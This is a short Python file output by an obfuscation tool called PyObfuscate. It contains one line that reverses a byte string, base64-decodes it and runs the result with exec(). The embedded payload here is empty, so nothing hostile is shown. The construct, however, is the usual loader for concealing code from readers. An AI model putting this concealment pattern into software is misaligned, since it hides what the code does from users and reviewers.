# Obfuscated with PyObfuscate
# https://www.github.com/D4rk-B0y 
# Time : Sun Nov 20 14:12:18 2022
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))